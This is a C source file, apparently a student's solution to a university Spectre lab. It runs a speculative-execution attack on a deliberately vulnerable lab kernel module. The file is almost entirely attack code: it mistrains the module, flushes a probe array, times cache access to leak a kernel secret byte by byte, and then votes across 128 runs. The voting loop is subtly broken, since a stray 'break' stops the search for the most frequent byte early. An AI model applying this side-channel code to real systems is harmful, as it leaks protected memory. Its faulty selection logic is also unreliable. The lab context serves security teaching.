/*
 * Exploiting Speculative Execution
 *
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

/*
 * call_kernel_part3
 * Performs the COMMAND_PART3 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART3;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");
    int64_t* buffer = malloc(22 * 1024 * 128 * sizeof(int64_t));
    int access_time_arr[128] = {0};
    int result_arr[128 * SHD_SPECTRE_LAB_SECRET_MAX_LEN] = {0};
    // for (current_offset = 0; current_offset < 1; current_offset++) {
    //     char leaked_byte;


    //     for(int l = 0; l < 512; l++) {
    //         call_kernel_part3(kernel_fd, shared_memory, 0);
    //     }    
  
    //     for(int k = 0; k < 128; k++) {

    //         for(int j = 0; j < 11 * 1024 * 1024; j+=8) {
    //             clflush(buffer + j);
    //         }
    //         for(int j = 0; j < 128 ; j++) {
    //             clflush(shared_memory + 4096 * j);
    //         }      
    //         call_kernel_part3(kernel_fd, shared_memory, current_offset);    
    //         for(int j = 0; j < 128; j++) {
    //             access_time_arr[j] += time_access(buffer + 4096 * j);
    //         }    
    //         // leaked_str[current_offset] = leaked_byte;
    //         // if (leaked_byte == '\x00') {
    //         //     break;
    //         // }
    //     }
    //     for(int i = 0; i < 128; i++) {
    //         printf("%d\n", access_time_arr[i]);
    //     }
    // }
    
    // for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
    //     char leaked_byte = 0;

    //     for(int l = 0; l < 256; l++) {
    //         call_kernel_part3(kernel_fd, shared_memory, 0);
    //     }    
    //     for(int j = 0; j < 128 ; j++) {
    //         clflush(shared_memory + 4096 * j);
    //     }   
    //     for(int j = 0; j < 22 * 1024 * 128; j+=8) {
    //         buffer[j] = 0;
    //     } 
    //     asm volatile("mfence");
    //     call_kernel_part3(kernel_fd, shared_memory, current_offset);
    //     int j;  
    //     for(j = 0; j < 128; j++) {
    //         if(time_access(shared_memory + 4096 * j) < 100) {
    //             leaked_byte = j;
    //             break;
    //         }
    //     }    

    //     leaked_str[current_offset] = leaked_byte;
    //     if (leaked_byte == '\x00') {
    //         break;
    //     }
    // }


    for(int repeat = 0; repeat < 128; repeat++) {
        for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
            char leaked_byte = -1;
            int leaked_str_counter[128] = {0};
    
            for(int l = 0; l < 128; l++) {
                call_kernel_part3(kernel_fd, shared_memory, 0);
            }    
            for(int j = 0; j < 22 * 1024 * 128; j+=8) {
                buffer[j] = 0;
            } 
            for(int j = 0; j < 128 ; j++) {
                clflush(shared_memory + 4096 * j);
            }   
            call_kernel_part3(kernel_fd, shared_memory, current_offset);  
            int j;  
            for(j = 0; j < 128; j++) {
                if(time_access(shared_memory + 4096 * j) < 100) {
                    leaked_byte = j;
                    break;
                }
            }    
            if(leaked_byte != -1) {
                result_arr[current_offset * 128 + leaked_byte] += 1;
                if (leaked_byte == '\x00') {
                    break;
                }
            }
        }
    }

    for(int i = 0; i < SHD_SPECTRE_LAB_SECRET_MAX_LEN; i++) {
        int max_index = 0;
        int max_value = result_arr[i * 128 + 0];
        for(int j = 1; j < 128; j++) {
            if(result_arr[i * 128 + j] > max_value) {
                max_value = result_arr[i * 128 + j];
                max_index = j;
                break;
            }
        }
        leaked_str[i] = max_index;
    }

    printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}

